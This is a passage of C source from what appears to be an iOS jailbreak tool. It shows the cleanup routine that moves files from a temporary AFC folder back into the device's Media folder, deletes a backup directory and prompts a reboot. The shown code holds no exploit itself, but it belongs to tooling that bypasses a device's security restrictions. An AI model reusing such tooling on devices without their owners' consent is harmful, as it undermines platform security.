        //fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
    }

    i = 0;
    while (list && list[i]) {
        if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
            i++;
            continue;
        }

        char *tmpname = (char *)malloc(1 + strlen(list[i]) + 1);
        strcpy(tmpname, "/");
        strcat(tmpname, list[i]);
        rmdir_recursive_afc(afc, tmpname, 1);

        char *tmxname =
            (char *)malloc(1 + strlen(AFCTMP) + 1 + strlen(list[i]) + 1);
        strcpy(tmxname, "/" AFCTMP "/");
        strcat(tmxname, list[i]);

        DEBUG("moving %s to %s\n", tmxname, tmpname);
        afc_rename_path(afc, tmxname, tmpname);

        free(tmxname);
        free(tmpname);

        i++;
    }
    free_dictionary(list);

    afc_remove_path(afc, "/" AFCTMP);
    if (afc_read_directory(afc, "/" AFCTMP, &list) == AFC_E_SUCCESS) {
        fprintf(stderr,
                "WARNING: the folder /" AFCTMP
                " is still present in the user's Media folder. You have to check yourself for any leftovers and move them back if required.\n");
    }

    rmdir_recursive(backup_dir);

    WARN("Done! If the jailbreak is successful, reboot the device.\n");
 leave:
    afc_client_free(afc);
    afc = NULL;
    device_free(device);
    device = NULL;

    return 0;
}
